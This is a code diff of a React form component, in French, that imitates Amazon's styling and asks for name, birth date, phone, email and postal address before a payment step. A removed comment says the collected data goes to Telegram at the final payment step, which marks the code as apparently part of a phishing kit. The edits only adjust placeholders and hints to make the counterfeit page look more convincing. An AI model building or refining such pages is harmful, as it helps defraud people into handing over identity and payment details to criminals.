@@ -55,7 +55,6 @@ export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: 
       ville: String(data.get('ville') ?? ''),
     };
 
-    // Pas d'envoi Telegram ici : l'envoi se fait à la dernière étape (SafePaymentStep)
     onContinue(details);
   }
 
@@ -67,16 +66,16 @@ export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: 
       <FormSection title="Identité" hint="Nom et prénom tels qu'indiqués sur votre compte Amazon." layout="identity">
         <Field id="prenom" label="Prénom" defaultValue={initial.prenom} autoComplete="given-name" minLength={2} maxLength={50} pattern="[\p{L}'’ .-]{2,50}" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
         <Field id="nom" label="Nom" defaultValue={initial.nom} autoComplete="family-name" minLength={2} maxLength={50} pattern="[\p{L}'’ .-]{2,50}" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
-        <Field id="date-naissance" label="Date de naissance" defaultValue={initial.dateNaissance} placeholder="JJ/MM/AAAA" autoComplete="bday" inputMode="numeric" maxLength={10} hint="Les barres obliques sont ajoutées automatiquement." pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" onInput={formatBirthDate}/>
+        <Field id="date-naissance" label="Date de naissance" defaultValue={initial.dateNaissance} placeholder="JJ/MM/AAAA" autoComplete="bday" inputMode="numeric" maxLength={10} pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" onInput={formatBirthDate}/>
       </FormSection>
       <FormSection title="Contact" hint="Pour vous envoyer la confirmation et vous joindre si nécessaire.">
-        <Field id="telephone" label="Téléphone" defaultValue={initial.telephone} type="tel" autoComplete="tel" inputMode="tel" maxLength={13} placeholder="0470 12 34 56" hint="Les espaces sont ajoutés automatiquement." pattern="0[0-9]{3}( [0-9]{2}){3}" onInput={formatPhone}/>
-        <Field id="email" label="Adresse e-mail" defaultValue={initial.email} type="email" autoComplete="email" maxLength={120}/>
+        <Field id="telephone" label="Téléphone" defaultValue={initial.telephone} type="tel" autoComplete="tel" inputMode="tel" maxLength={13} placeholder="Numéro de Téléphone" pattern="0[0-9]{3}( [0-9]{2}){3}" onInput={formatPhone}/>
+        <Field id="email" label="Adresse e-mail" defaultValue={initial.email} type="email" autoComplete="email" maxLength={120} placeholder="E-mail"/>
       </FormSection>
       <FormSection title="Adresse" hint="Adresse postale associée à votre compte ou à votre abonnement.">
         <Field id="adresse" label="Adresse" defaultValue={initial.adresse} autoComplete="street-address" minLength={5} maxLength={120} placeholder="N° et nom de rue" full/>
-        <Field id="code-postal" label="Code postal" defaultValue={initial.codePostal} autoComplete="postal-code" inputMode="numeric" maxLength={5} pattern="[0-9]{5}" placeholder="75001" onInput={digitsOnly}/>
-        <Field id="ville" label="Ville" defaultValue={initial.ville} autoComplete="address-level2" minLength={2} maxLength={80} pattern="[\p{L}'’ .-]{2,80}" placeholder="Paris" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
+        <Field id="code-postal" label="Code postal" defaultValue={initial.codePostal} autoComplete="postal-code" inputMode="numeric" maxLength={5} pattern="[0-9]{5}" placeholder="Code Postal" onInput={digitsOnly}/>
+        <Field id="ville" label="Ville" defaultValue={initial.ville} autoComplete="address-level2" minLength={2} maxLength={80} pattern="[\p{L}'’ .-]{2,80}" placeholder="Ville" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
       </FormSection>
       <div className="amz-actions"><button className="amz-btn amz-btn--primary" type="submit">Continuer</button><button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>Retour</button></div>
     </form>
